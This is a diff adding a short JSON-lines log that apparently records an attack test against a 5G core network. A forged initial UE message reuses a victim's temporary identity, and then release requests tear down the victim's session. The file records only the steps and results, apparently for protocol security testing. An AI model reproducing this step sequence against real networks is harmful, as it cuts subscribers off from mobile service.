@@ -1,0 +1,8 @@
+{"attack": "chain-initue-release", "step": "initial-ue", "ran_ue_id": 99, "amf_set_id": 1, "amf_pointer": 1, "tmsi": "4e4f2ed4", "victim_amf_ue_id": 6}
+{"attack": "chain-initue-release", "step": "dl-after-initue", "message": "DownlinkNASTransport", "amf_ue_ngap_id": 7, "ran_ue_ngap_id": 99}
+{"attack": "chain-initue-release", "step": "ue-release", "target": "victim", "amf_ue_ngap_id": 6, "ran_ue_id": 99, "pdu_sessions": [1]}
+{"attack": "chain-initue-release", "step": "release-command", "target": "victim", "result": "UEContextReleaseCommand"}
+{"attack": "chain-initue-release", "step": "release-complete", "target": "victim", "amf_ue_ngap_id": 6, "ran_ue_id": 99, "pdu_sessions": [1]}
+{"attack": "chain-initue-release", "step": "ue-release", "target": "learned", "amf_ue_ngap_id": 7, "ran_ue_id": 99, "pdu_sessions": [1]}
+{"attack": "chain-initue-release", "step": "release-command", "target": "learned", "result": "UEContextReleaseCommand"}
+{"attack": "chain-initue-release", "step": "release-complete", "target": "learned", "amf_ue_ngap_id": 7, "ran_ue_id": 99, "pdu_sessions": [1]}
